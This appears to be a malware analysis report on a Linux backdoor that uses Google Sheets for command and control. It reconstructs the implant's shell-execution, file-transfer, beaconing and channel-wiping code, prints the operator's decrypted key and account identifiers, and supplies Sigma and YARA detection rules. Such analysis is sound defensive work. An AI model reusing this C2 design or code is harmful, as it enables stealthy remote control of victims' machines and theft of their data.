# GridTide — Full Reverse Engineering Analysis
## Google Sheets C2 Backdoor (Linux ELF64)

---

> **Analyst Notes:** Analysis conducted via Ghidra across multiple sessions on a 64-bit Linux ELF binary. All function names below are analyst-assigned labels.  
> **SHA-256:** `ce36a5fc44cbd7de947130b67be9e732a7b4086fb1df98a5afd724087c973b47`  
> **Config file analysed:** `xapt.cfg` (16 bytes, AES-128 key)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Binary Overview](#2-binary-overview)
3. [Credential System & Configuration](#3-credential-system--configuration)
4. [Authentication Flow — OAuth2 via JWT](#4-authentication-flow--oauth2-via-jwt)
5. [Network Layer — Custom TLS Client](#5-network-layer--custom-tls-client)
6. [C2 Protocol — Google Sheets as Command Channel](#6-c2-protocol--google-sheets-as-command-channel)
7. [Command Dispatch](#7-command-dispatch)
   - 7.1 [Shell Execution — `C-C`](#71-shell-execution----c-c)
   - 7.2 [File Upload (Write to Victim) — `C-U`](#72-file-upload-write-to-victim----c-u)
   - 7.3 [File Download (Read from Victim) — `C-d`](#73-file-download-read-from-victim----c-d)
8. [Beacon — System Information Reporting](#8-beacon--system-information-reporting)
9. [Anti-Forensics & Operational Security](#9-anti-forensics--operational-security)
10. [Decrypted Credentials](#10-decrypted-credentials)
11. [Complete Function Inventory](#11-complete-function-inventory)
12. [Detection & Response](#12-detection--response)
13. [Architecture Diagram](#13-architecture-diagram)
14. [YARA Rule](#14-yara-rule)

---

## 1. Executive Summary

GridTide is a Linux ELF64 backdoor that uses **Google Sheets as its C2 channel**. Rather than connecting to an attacker-controlled IP or domain, the implant authenticates to the Google Sheets API using an embedded service account and polls a specific spreadsheet for commands. Responses — including command output, uploaded/downloaded file data, and victim system beacons — are written back to the same spreadsheet.

This architecture makes the implant extremely difficult to detect via network monitoring: all traffic is HTTPS to legitimate Google infrastructure (`sheets.googleapis.com`, `oauth2.googleapis.com`), authenticated with a real Google service account using the standard OAuth2 JWT flow. The User-Agent header is spoofed to impersonate Google's own Java client library, making the traffic indistinguishable from legitimate enterprise Google API usage.

**Capabilities:** remote shell execution, bidirectional file transfer


---

## 2. Binary Overview

| Property | Value |
|---|---|
| Format | ELF64, Linux x86-64 |
| Linking | Static (OpenSSL 1.0.2k fully embedded) |
| Debug symbols | None stripped |
| Notable imports | `popen`, `fopen`, `fread`, `fwrite`, `getifaddrs`, `gethostname`, `getpwuid` |
| Embedded library | OpenSSL 1.0.2k (statically linked, ~2MB) |
| Config sidecar | `.cfg` file at same path as binary (extension replaced) |
| Entry function | `main_loop` at `0x004095f0` |

The binary carries **no plaintext credentials**. All sensitive values (spreadsheet ID, service account email, RSA private key, JWT key ID) are stored as AES-128-CBC encrypted base64 blobs in `.rodata`, decrypted at runtime only when the sidecar `.cfg` file is present.

---

## 3. Credential System & Configuration

### 3.1 Sidecar `.cfg` File

```
/path/to/binary      → the implant
/path/to/binary.cfg  → 16-byte AES-128 key (key = IV)
```

On startup `load_and_decrypt_config` (`0x004086b0`) reads exactly 16 bytes from the `.cfg` file. These bytes serve as **both the AES key and IV** for CBC decryption.

```c
// Pseudocode — load_and_decrypt_config (0x004086b0)
char cfg_path[4096];
snprintf(cfg_path, sizeof(cfg_path), "%s", argv[0]);
// Replace extension: find last '.' and write ".cfg\0"
replace_extension(cfg_path, ".cfg");

FILE *f = fopen(cfg_path, "rb");
uint8_t aes_key_iv[16];
fread(aes_key_iv, 1, 16, f);   // key AND iv = same 16 bytes
fclose(f);

// Decrypt 4 blobs from .rodata using AES-128-CBC
g_spreadsheet_id      = decrypt_blob(rodata_blob1, aes_key_iv, aes_key_iv);
g_jwt_key_id          = decrypt_blob(rodata_blob2, aes_key_iv, aes_key_iv);
g_service_account_email = decrypt_blob(rodata_blob3, aes_key_iv, aes_key_iv);
g_rsa_private_key_pem = decrypt_blob(rodata_blob4, aes_key_iv, aes_key_iv);
```

### 3.2 Encrypted Blobs in `.rodata`

| Global | Address | Blob Address | Plaintext (decrypted with `xapt.cfg`) |
|---|---|---|---|
| `g_spreadsheet_id` | `0x00763d10` | `0x004f4eb0` | `1KWlHcaRaVFc6GbqM86-nnJgsL8yHFmUifK2QoHLCX2M` |
| `g_jwt_key_id` | `0x00763d08` | `0x004f4ef8` | `028730c5a3dca079936dd0cb7c4e6da19b4299a7` |
| `g_service_account_email` | `0x00763cf8` | `0x004f4f40` | `vasolk@tidy-hold-466804-p0.iam.gserviceaccount.com` |
| `g_rsa_private_key_pem` | `0x00763d00` | `0x004f4fa0` | RSA-2048 PKCS8 PEM (1704 bytes, encrypted blob at offset) |

### 3.3 Decryption Snippet

The AES-128-CBC decryption used by the implant (from `load_and_decrypt_config`) reused the same buffer for key and IV — a notable implementation choice that means compromising the `.cfg` file is sufficient to decrypt all credentials:

```python
# Decrypt any blob from this implant given the 16-byte .cfg contents
import base64
from Crypto.Cipher import AES

def decrypt_credential(b64_ciphertext: str, cfg_bytes: bytes) -> str:
    """cfg_bytes = raw 16-byte content of the .cfg sidecar file."""
    key = cfg_bytes        # AES-128 key
    iv  = cfg_bytes        # IV == key (intentional — same buffer in C code)
    ct  = base64.b64decode(b64_ciphertext)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    # PKCS7 unpad
    pad_len = pt[-1]
    return pt[:-pad_len].decode('utf-8')
```

---

## 4. Authentication Flow — OAuth2 via JWT

The implant authenticates to Google APIs using the **OAuth2 service account JWT bearer flow** — the same mechanism used by legitimate GCP applications.

### 4.1 JWT Construction (`build_and_send_jwt_auth`, `0x00408e70`)

```c
// Pseudocode — JWT assembly
time_t now = time(NULL);
long exp = now + 3600;  // 1-hour expiry

// Header JSON
char header[] = "{\"alg\":\"RS256\","
                 "\"kid\":\"<g_jwt_key_id>\","
                 "\"typ\":\"JWT\"}";

// Claims JSON
char claims[] = "{"
    "\"aud\":\"https://oauth2.googleapis.com/token\","
    "\"exp\":%ld,"
    "\"iat\":%ld,"
    "\"iss\":\"%s\","       // g_service_account_email
    "\"sub\":\"%s\","       // g_service_account_email
    "\"scope\":\"https://www.googleapis.com/auth/spreadsheets "
               "https://www.googleapis.com/auth/spreadsheets.readonly "
               "https://www.googleapis.com/auth/drive.file "
               "https://www.googleapis.com/auth/drive.readonly "
               "https://www.googleapis.com/auth/drive\""
"}";

// Assemble unsigned JWT
char *b64_header = base64url_encode(header);
char *b64_claims = base64url_encode(claims);
char *signing_input = concat(b64_header, ".", b64_claims);

// Sign with RSA-SHA256 via OpenSSL
uint8_t signature[256];
sign_jwt_rs256(signing_input, g_rsa_private_key_pem, signature);
char *b64_sig = base64url_encode(signature);

// Final JWT: <header>.<claims>.<signature>
char *jwt = concat(signing_input, ".", b64_sig);
```

### 4.2 Token Exchange (`refresh_oauth_token`, `0x00409030`)

```c
// POST to oauth2.googleapis.com/token
char body[] = "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3A"
              "jwt-bearer&assertion=<JWT>";

tls_connect_and_send_recv("oauth2.googleapis.com", body, &response);

// Extract access_token from JSON response
// Uses strstr("access_token\":\"") — brittle but functional
char *token_start = strstr(response, "access_token\":\"") + 15;
char *token_end   = strchr(token_start, '"');
strncpy(g_oauth_bearer_token, token_start, token_end - token_start);
```

`g_oauth_bearer_token` at `0x00763cf0` is refreshed automatically when the API returns HTTP 401 (`validate_http_200_or_refresh_token`, `0x00409060`).

---

## 5. Network Layer — Custom TLS Client

All network communication goes through `tls_connect_and_send_recv` (`0x00407940`), a custom TLS client built on the statically-linked OpenSSL 1.0.2k.

```c
// Pseudocode — tls_connect_and_send_recv (0x00407940)
int sock = socket(AF_INET, SOCK_STREAM, 0);

// 30-second receive timeout
struct timeval tv = {.tv_sec = 30};
setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

// DNS resolve + connect
struct hostent *h = gethostbyname(hostname);
connect(sock, &addr, sizeof(addr));

// TLS handshake
SSL_CTX *ctx = SSL_CTX_new(TLSv1_client_method());
// !! NO SSL_CTX_set_verify() call — certificate validation DISABLED !!
// Accepts ANY server certificate (self-signed, expired, wrong CN)
SSL *ssl = SSL_new(ctx);
SSL_set_fd(ssl, sock);
SSL_connect(ssl);  // MITM vulnerable

// Send request
SSL_write(ssl, request, request_len);

// Read response — handles both Content-Length and chunked Transfer-Encoding
// Reads in 4095-byte chunks with dynamic realloc
char *response = malloc(4096);
size_t total = 0;
while ((n = SSL_read(ssl, buf, 4095)) > 0) {
    response = realloc(response, total + n + 1);
    memcpy(response + total, buf, n);
    total += n;
}

// Decompress if response is gzip-encoded
if (strstr(headers, "Content-Encoding: gzip"))
    gzip_decompress(response, total, &decompressed);
```

---

## 6. C2 Protocol — Google Sheets as Command Channel

The operator interacts with the implant exclusively through a single Google Sheets document. Commands are written to cell `a1`; results and beacons are written to cells `a1`–`aN` and `vN`.

### 6.1 Poll Loop (`main_loop`, `0x004095f0`)

```c
// Pseudocode — main_loop (0x004095f0)
load_and_decrypt_config(argv[0]);
refresh_oauth_token();
clear_sheets_c2_channel();        // batchClear a1:z1000 — wipe previous session
collect_and_send_initial_beacon(); // write system info to cell v1

int poll_count = 0;
while (1) {
    char *command = fetch_and_parse_command();

    if (command == NULL) {
        // Adaptive backoff
        if (poll_count < 121)
            sleep(1);
        else
            sleep(rand() % 301 + 300);  // 300–600 seconds jitter
        poll_count++;
        continue;
    }

    poll_count = 0;
    dispatch_command(command);
    sleep(1);
}
```

### 6.2 Fetching Commands (`poll_c2_google_sheets`, `0x00409130`)

```c
// GET request to read cell a1
// Template stored at 0x004f4af8
char request[4096];
snprintf(request, sizeof(request),
    "GET /v4/spreadsheets/%s/values/%s?valueRenderOption=FORMULA HTTP/1.1\r\n"
    "Host: sheets.googleapis.com\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Authorization: Bearer %s\r\n"
    "User-Agent: Directory API Google-API-Java-Client/2.0.0 "
                "Google-HTTP-Java-Client/1.42.3 (gzip)\r\n"
    "Content-Type: application/json; charset=UTF-8\r\n"
    "Content-Encoding: gzip\r\n\r\n",
    g_spreadsheet_id, "a1", g_oauth_bearer_token);

tls_connect_and_send_recv("sheets.googleapis.com", request, &response);
```

The spoofed `User-Agent` — `Directory API Google-API-Java-Client/2.0.0` — mimics Google's own Java client library. Combined with legitimate OAuth2 tokens and HTTPS to `sheets.googleapis.com`, the traffic is virtually indistinguishable from a legitimate enterprise application.

### 6.3 Writing Results (`write_batch_update_to_sheets`, `0x004093d0`)

```c
// POST batchUpdate to write results back into the spreadsheet
// Template stored at 0x004f4c40
char request[...];
snprintf(request, sizeof(request),
    "POST /v4/spreadsheets/%s/values:batchUpdate HTTP/1.1\r\n"
    "Host: sheets.googleapis.com\r\n"
    "Authorization: Bearer %s\r\n"
    "User-Agent: Google-HTTP-Java-Client/1.42.3 (gzip)\r\n"
    "Content-Type: application/json; charset=UTF-8\r\n"
    "Content-Encoding: gzip\r\n"
    "Content-Length: %zu\r\n\r\n",
    g_spreadsheet_id, g_oauth_bearer_token, body_len);

// Body is gzip-compressed JSON
gzip_compress(json_body, &compressed, &compressed_len);
// Send full request
```

### 6.4 Clearing the Channel (`clear_sheets_c2_channel`, `0x004094e0`)

```c
// batchClear wipes a1:z1000 after reading each command
// JSON body stored literally at 0x004f482d
char body[] = "{\"ranges\":[\"a1:z1000\"]}";

// POST to /v4/spreadsheets/<id>/values:batchClear
// Template stored at 0x004f4d60
```

This ensures the spreadsheet contains only the current command/response at any time — no history is preserved. An operator monitoring the sheet sees at most one command and its result before the next wipe.

---

## 7. Command Dispatch

### Command Wire Format

Commands are read from cell `a1` as a **base64-encoded string**. After decoding, the format is:

```
TYPE-SUBTYPE-DATA-EXTRA
```

Split on `-` delimiter into up to 4 fields. `TYPE` selects the handler; `DATA` and `EXTRA` are base64-encoded payloads.

---

### 7.1 Shell Execution — `C-C`

**Command:** `C-C-<base64(shell_command)>`

```c
// Pseudocode — execute_shell_command (0x00407310)
char *cmd = base64_decode(fields[2]);   // decode the shell command

// Append stderr redirect and execute via popen
char full_cmd[strlen(cmd) + 8];
snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", cmd);
FILE *fp = popen(full_cmd, "r");

// Read stdout+stderr in 1KB chunks into a dynamically growing buffer
char *output = malloc(1024);
size_t total = 0;
char buf[1024];
while (fgets(buf, sizeof(buf), fp)) {
    output = realloc(output, total + 1024);
    strcpy(output + total, buf);
    total += strlen(buf);
}
pclose(fp);

// Base64-encode full output and chunk at 45,000 bytes per cell
char *b64_output = base64_encode(output, total);
int n_chunks = ceil(strlen(b64_output) / 45000.0);

// Write response to spreadsheet:
//   a1  = base64("S-C-R-<N+2>")   status: N+2 total cells used
//   a2..aN = 45KB base64 data chunks
//   vN  = base64(system_info_beacon)
```

**Response status code:** `S-C-R-<N>` where N = total cell count including status and beacon cells.

---

### 7.2 File Upload (Write to Victim) — `C-U`

**Command:** `C-U-<base64(dest_path)>-<chunk_count>`

```c
// Pseudocode — file upload handler
char *dest_path   = base64_decode(fields[2]);
int   chunk_count = atoi(fields[3]);

// Reassemble multi-chunk payload from cells a2..a(N)
// reassemble_chunked_response (0x00409260) reads chunk_count cells
char *b64_payload = reassemble_chunked_response(chunk_count);
char *file_bytes  = base64_decode(b64_payload);
size_t file_size  = base64_decoded_len(b64_payload);

// Write file to destination
FILE *f = fopen(dest_path, "wb");
if (!f) {
    // Failure: write "S-U-<strerror()>-1" to a1
    write_result("S-U-" + strerror(errno) + "-1");
    return;
}
fwrite(file_bytes, 1, file_size, f);
fclose(f);

// Success: write "S-U-R-1" to a1
write_result("S-U-R-1");
// Beacon to vN
```

**Response:** `S-U-R-1` on success, `S-U-<strerror>-1` on failure (e.g. `S-U-Permission denied-1`).

---

### 7.3 File Download (Read from Victim) — `C-d`

**Command:** `C-d-<base64(src_path)>`

```c
// Pseudocode — file download handler
char *src_path = base64_decode(fields[2]);

// Get file size via stat()
struct stat st;
if (stat(src_path, &st) != 0) {
    write_result("S-D-" + strerror(errno) + "-0");
    return;
}

// Read entire file into memory
FILE *f = fopen(src_path, "rb");
char *file_bytes = malloc(st.st_size);
fread(file_bytes, 1, st.st_size, f);
fclose(f);

// Base64-encode and chunk at 45,000 bytes
char *b64 = base64_encode(file_bytes, st.st_size);
int n_chunks = ceil(strlen(b64) / 45000.0);

// Write to spreadsheet:
//   a1     = base64("S-D-R-<N+2>")
//   a2..aN = 45KB base64 data chunks
//   vN     = beacon
```

**Response:** `S-D-R-<N>` on success, `S-D-<strerror>-0` on failure.

---

## 8. Beacon — System Information Reporting

Every command response includes a system information beacon written to the last column cell (`v1` for single-chunk responses, `vN` for multi-chunk). The beacon is collected by `collect_system_info_beacon` (`0x004080c0`) and base64-encoded before transmission.

### 8.1 Beacon Collection Code

```c
// Pseudocode — collect_system_info_beacon (0x004080c0)
char beacon[4096] = {0};
char hostname[256];
gethostname(hostname, sizeof(hostname));

// Enumerate all non-loopback network interfaces
struct ifaddrs *ifap;
getifaddrs(&ifap);
char ip_buf[NI_MAXHOST];
// For each interface: getnameinfo() to get IP string

// Get current user
struct passwd *pw = getpwuid(getuid());

// Get timezone abbreviation
time_t t = time(NULL);
struct tm *tm_info = localtime(&t);
char tz_abbr[64];
strftime(tz_abbr, sizeof(tz_abbr), "%Z", tm_info);

// Format beacon — NOTE: "tmezone" typo is in the binary
snprintf(beacon, sizeof(beacon),
    "hostName: %s\n"
    "IP:       %s\n"   // repeated for each interface
    "os:       %s\n"   // uname.sysname
    "user:     %s\n"
    "dir:      %s\n"   // getcwd()
    "lang:     %s\n"   // getenv("LANG")
    "time:     %s\n"   // YYYY-MM-DD HH:MM:SS
    "tmezone:  %s\n",  // !! "tmezone" typo — intentional fingerprint !!
    hostname, ip_str, os_str, pw->pw_name, cwd, lang, time_str, tz_abbr);
```

### 8.2 Beacon Format

```
hostName: victim-host-01
IP:       192.168.1.42
IP:       10.0.0.5
os:       Linux
user:     www-data
dir:      /var/www
lang:     en_US.UTF-8
time:     2025-03-15 14:22:07
tmezone:  UTC
```

> 🔎 **Behavioral fingerprint:** The typo `tmezone` (missing 'i') appears at the string literal level in `.rodata` and is present in every beacon this malware family sends. It is a reliable YARA/Sigma detection string.

---

## 9. Anti-Forensics & Operational Security

### 9.1 C2 Channel Erasure

After reading and dispatching each command, `clear_sheets_c2_channel` posts a `batchClear` to wipe `a1:z1000`:

```c
// Wipes the entire command/response history from the spreadsheet
// Operator sees only the live current command at any time
char body[] = "{\"ranges\":[\"a1:z1000\"]}";
POST /v4/spreadsheets/<id>/values:batchClear
```

No command history survives in the spreadsheet. Forensic review of the spreadsheet would yield nothing unless the analyst is monitoring in real time.

### 9.2 Credential Encryption

```
Binary .rodata:  4 × AES-128-CBC encrypted base64 blobs
Sidecar .cfg:    16-byte decryption key (key = IV)

Without .cfg → binary contains zero usable credentials
Deleting .cfg → implant cannot start / cannot authenticate
```

### 9.3 Traffic Blending

| Property | Implant Value | Legitimate Value |
|---|---|---|
| Destination host | `sheets.googleapis.com` | `sheets.googleapis.com` |
| Protocol | HTTPS/TLS | HTTPS/TLS |
| Auth mechanism | OAuth2 Bearer | OAuth2 Bearer |
| User-Agent | `Directory API Google-API-Java-Client/2.0.0` | Same (spoofed) |
| Content-Encoding | `gzip` | `gzip` |
| API calls used | `values.get`, `values.batchUpdate`, `values.batchClear` | Same |

The traffic is **indistinguishable from a legitimate application** using the Google Sheets API unless the observer can inspect the specific spreadsheet ID or service account being used.

---

## 10. Decrypted Credentials

The following credentials were recovered by decrypting the `.rodata` blobs using the `xapt.cfg` key (`MiAw)@)25l@02YCm`, 16 bytes):

| Credential | Value |
|---|---|
| **AES Key (from `xapt.cfg`)** | `MiAw)@)25l@02YCm` |
| **Spreadsheet ID** | `1KWlHcaRaVFc6GbqM86-nnJgsL8yHFmUifK2QoHLCX2M` |
| **C2 Sheet URL** | `https://docs.google.com/spreadsheets/d/1KWlHcaRaVFc6GbqM86-nnJgsL8yHFmUifK2QoHLCX2M` |
| **Service Account** | `vasolk@tidy-hold-466804-p0.iam.gserviceaccount.com` |
| **GCP Project** | `tidy-hold-466804-p0` (project number: `466804`) |
| **JWT Key ID** | `028730c5a3dca079936dd0cb7c4e6da19b4299a7` (SHA-1 cert fingerprint) |
| **RSA Private Key** | PKCS8 PEM, 1704 bytes, blob at binary offset `0x4f4fa0` |

**Attribution notes:**

- `tidy-hold-466804-p0` — the `-p0` suffix is a Terraform naming convention (`project-0`), suggesting automated GCP infrastructure provisioning.
- Account name `vasolk` is likely an attacker-chosen alias.
- The numeric project ID `466804` can be used to query GCP abuse channels.

**Recommended actions:**

1. Report spreadsheet ID to Google's abuse team: `https://support.google.com/docs/contact`
2. Report GCP project `tidy-hold-466804-p0` to Google Cloud Trust & Safety
3. Revoke or delete service account `vasolk@tidy-hold-466804-p0.iam.gserviceaccount.com` if accessible
4. Add the spreadsheet ID and service account to your threat intelligence platform

---

---

## 11. Complete Function Inventory

All 35+ custom functions identified and renamed during analysis:

### C2 Protocol & Command Dispatch

| Function Name | Address | Description |
|---|---|---|
| `main_loop` | `0x004095f0` | Entry point; startup sequence + poll loop |
| `fetch_and_parse_command` | `0x00409320` | Read + base64-decode cell `a1` |
| `poll_c2_google_sheets` | `0x00409130` | Build + send GET to Sheets API |
| `reassemble_chunked_response` | `0x00409260` | Join multi-row response cells |
| `clear_sheets_c2_channel` | `0x004094e0` | batchClear `a1:z1000` |
| `write_batch_update_to_sheets` | `0x004093d0` | Write results via batchUpdate |
| `send_response_to_sheets` | — | Wrapper for batchUpdate POST |
| `build_batch_update_json` | `0x00407120` | Construct batchUpdate JSON body |
| `execute_shell_command` | `0x00407310` | `popen()` shell command + capture output |

### Authentication & Cryptography

| Function Name | Address | Description |
|---|---|---|
| `load_and_decrypt_config` | `0x004086b0` | Read `.cfg`, AES-decrypt 4 credential blobs |
| `refresh_oauth_token` | `0x00409030` | Token lifecycle management |
| `build_and_send_jwt_auth` | `0x00408e70` | OAuth2 JWT flow orchestration |
| `sign_jwt_rs256` | `0x00408d00` | Build + sign RS256 JWT |
| `rsa_sign_pkcs1` | `0x00408c20` | OpenSSL `RSA_sign()` wrapper |
| `base64url_encode` | `0x004085b0` | JWT-compatible base64url encoding |
| `base64_encode` | `0x004080b0` | Standard base64 encoding |
| `base64_decode_impl` | — | Standard base64 decode |
| `thunk_base64_decode` | — | Decode wrapper / thunk |

### Network & TLS

| Function Name | Address | Description |
|---|---|---|
| `tls_connect_and_send_recv` | `0x00407940` | Custom TLS client (no cert validation) |
| `validate_http_200_or_refresh_token` | `0x00409060` | Check HTTP status; trigger refresh on 401 |
| `parse_http_response` | `0x00407500` | Extract values from HTTP response body |
| `parse_oauth_token_response` | `0x00407480` | Extract `access_token` from token response |
| `gzip_compress` | `0x00407d90` | Compress request bodies |
| `gzip_decompress` | `0x004077a0` | Decompress API responses |
| `url_encode` | `0x00406fe0` | `grant_type` URL encoding |
| `ssl_init_openssl` | `0x0041dfb0` | OpenSSL global initialisation |

### System Information

| Function Name | Address | Description |
|---|---|---|
| `collect_system_info_beacon` | `0x004080c0` | Collect hostname, IPs, user, OS, CWD, LANG, time, timezone |

### Statically-Linked OpenSSL 1.0.2k

| Function Name | Address |
|---|---|
| `ssl23_connect_state_machine` | `0x0040a630` |
| `ssl23_read` | — |
| `ssl23_write` | — |
| `ssl23_peek` | — |
| `ssl_get_version_method` | — |
| `ssl_random_bytes_with_timestamp` | — |
| `ssl_get_cipher_by_index` | — |

---

## 12. Detection & Response

### 14.1 Network Indicators

| Indicator | Type | Notes |
|---|---|---|
| `sheets.googleapis.com` | Hostname | All C2 traffic |
| `oauth2.googleapis.com` | Hostname | Token refresh (POST every ~1 hour) |
| `Directory API Google-API-Java-Client/2.0.0 Google-HTTP-Java-Client/1.42.3 (gzip)` | User-Agent (GET) | Used for batchClear and GET |
| `Google-HTTP-Java-Client/1.42.3 (gzip)` | User-Agent (POST) | Used for batchUpdate |
| `/v4/spreadsheets/.*/values/a1?valueRenderOption=FORMULA` | URL path | Command poll |
| `/v4/spreadsheets/.*/values:batchUpdate` | URL path | Result write-back |
| `/v4/spreadsheets/.*/values:batchClear` | URL path | Channel wipe |
| `1KWlHcaRaVFc6GbqM86-nnJgsL8yHFmUifK2QoHLCX2M` | Spreadsheet ID | C2 document |
| `vasolk@tidy-hold-466804-p0.iam.gserviceaccount.com` | Service account | OAuth2 identity |

### 14.2 Host Indicators

| Indicator | Type | Notes |
|---|---|---|
| Binary + `.cfg` sidecar (same path, `.cfg` extension) | File pattern | 16-byte AES key file |
| `tmezone` (with typo) | String | In beacon output / `.rodata` |
| `{"ranges":["a1:z1000"]}` | String | batchClear body in `.rodata` |
| `S-C-R-`, `S-U-R-`, `S-D-R-` | String | Response status code prefixes |
| Statically linked OpenSSL 1.0.2k | Binary signature | Large embedded TLS library |
| `urn:ietf:params:oauth:grant-type:jwt-bearer` | String | JWT grant type in `.rodata` |

### 14.3 Sigma Rule (Process / Network)

```yaml
title: GridTide Google Sheets C2 Backdoor
id: a8c3f21b-4e5d-4a7c-bc9d-1234567890ab
status: experimental
description: Detects GridTide implant polling Google Sheets API as C2 channel
logsource:
    category: network_connection
detection:
    selection_host:
        DestinationHostname|contains:
            - 'sheets.googleapis.com'
            - 'oauth2.googleapis.com'
    selection_ua:
        http.useragent|contains:
            - 'Directory API Google-API-Java-Client/2.0.0'
    selection_path:
        http.url|contains:
            - 'valueRenderOption=FORMULA'
            - 'values:batchClear'
    condition: selection_host and (selection_ua or selection_path)
level: high
tags:
    - attack.command_and_control
    - attack.t1102.002   # Web Service: Bidirectional Communication
    - attack.t1567.002   # Exfiltration Over Web Service
```

### 14.4 Immediate Response Actions

1. **Network:** Block or alert on `sheets.googleapis.com` connections from server hosts that have no legitimate business need for Google Sheets API access.
2. **IAM:** In Google Cloud, navigate to `tidy-hold-466804-p0` → Service Accounts → delete `vasolk`. This revokes all tokens immediately.
3. **Spreadsheet:** Report the spreadsheet ID `1KWlHcaRaVFc6GbqM86-nnJgsL8yHFmUifK2QoHLCX2M` to Google for deletion.
4. **Host forensics:** Search all systems for `.cfg` files of exactly 16 bytes co-located with ELF binaries — this is the credential key store pattern.
5. **Memory:** If the process is live, dump memory and search for the `g_oauth_bearer_token` global (`0x00763cf0`) — the live token can be used to access the C2 spreadsheet and observe operator activity.

---

## 13. Architecture Diagram

```
┌────────────────────────────────────────────────────────────┐
│                       OPERATOR SIDE                        │
│                                                            │
│   Google Sheets spreadsheet                                │
│   (GCP Project: tidy-hold-466804-p0)                       │
│                                                            │
│   Write command  →  cell a1                                │
│   Read output    ←  cells a1..aN  (base64 data chunks)     │
│   Read beacon    ←  cell vN       (system info)            │
└───────────────────────────┬────────────────────────────────┘
                            │
                            │  HTTPS (TLS 1.0) — no cert validation
                            │  Host: sheets.googleapis.com
                            │  Auth: Bearer <oauth2_token>
                            │  UA:   Google-HTTP-Java-Client/1.42.3
                            │
┌───────────────────────────▼────────────────────────────────┐
│                       IMPLANT SIDE                         │
│                                                            │
│  binary.cfg  (16 bytes — AES-128 key = IV)                 │
│       │                                                    │
│       ▼  decrypt from .rodata                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  g_spreadsheet_id      → 1KWlHcaRaVFc6GbqM86-nn…    │   │
│  │  g_service_account_email → vasolk@tidy-hold-…       │   │
│  │  g_rsa_private_key_pem → (RSA-2048 PKCS8 PEM)       │   │
│  │  g_jwt_key_id          → 028730c5a3dca079…          │   │
│  └─────────────────────────────────────────────────────┘   │
│       │                                                    │
│       ▼  OAuth2 JWT Flow                                   │
│  build RS256 JWT  →  POST oauth2.googleapis.com/token      │
│  extract access_token  →  g_oauth_bearer_token             │
│       │                                                    │
│       ▼  Poll Loop (adaptive backoff: 1s → 300–600s)       │
│  GET  a1  →  base64-decode  →  parse TYPE-SUBTYPE-DATA     │
│       │                                                    │
│       ├─ C-C  → popen(cmd+" 2>&1") → capture stdout/stderr │
│       ├─ C-U  → reassemble chunks → fopen(wb) → fwrite()   │
│       └─ C-d  → fopen(rb) → fread() → chunk output         │
│       │                                                    │
│       ▼  Build response                                    │
│  a1:  S-C-R-N / S-U-R-1 / S-D-R-N  (base64 status)         │
│  a2..aN: base64 data chunks (45KB each)                    │
│  vN:  beacon (hostname, IPs, os, user, dir, lang,          │
│               time, "tmezone" [sic])                       │
│       │                                                    │
│       ▼  gzip_compress → POST batchUpdate                  │
│       ▼  clear_sheets_c2_channel (batchClear a1:z1000)     │
│       ▼  sleep(1) → loop                                   │
└────────────────────────────────────────────────────────────┘
```

---

## 14. YARA Rule

```yara
rule GridTide_GoogleSheets_C2_Backdoor
{
    meta:
        description = "Detects GridTide Linux backdoor using Google Sheets as C2"
        author      = "Reverse Engineering Analysis"
        date        = "2026-02-27"
        hash        = "ce36a5fc44cbd7de947130b67be9e732a7b4086fb1df98a5afd724087c973b47"
        reference   = "gridtide-analysis.md"

    strings:
        // Behavioral fingerprint — typo present in every beacon
        $typo_tmezone = "tmezone:  " ascii

        // batchClear range — unique to this implant
        $batch_clear = "{\"ranges\":[\"a1:z1000\"]}" ascii

        // Response status code prefixes
        $status_c = "S-C-R-" ascii
        $status_u = "S-U-R-" ascii
        $status_d = "S-D-R-" ascii

        // Spoofed User-Agent matching Google Java client
        $ua = "Directory API Google-API-Java-Client/2.0.0 Google-HTTP-Java-Client/1.42.3 (gzip)" ascii

        // OAuth2 JWT grant type
        $jwt_grant = "urn:ietf:params:oauth:grant-type:jwt-bearer" ascii

        // Sheets API URL templates
        $api_get  = "/v4/spreadsheets/%s/values/%s?valueRenderOption=FORMULA" ascii
        $api_post = "/v4/spreadsheets/%s/values:batchUpdate" ascii

        // Beacon field labels
        $beacon_hostname = "hostName: " ascii
        $beacon_user     = "user:     " ascii

    condition:
        uint32(0) == 0x464c457f   // ELF magic
        and filesize > 1MB        // static linking makes binary large
        and (
            ($typo_tmezone and $batch_clear)
            or ($ua and $jwt_grant)
            or (3 of ($status_c, $status_u, $status_d, $api_get, $api_post))
            or ($beacon_hostname and $beacon_user and $typo_tmezone)
        )
}
```

---

*End 
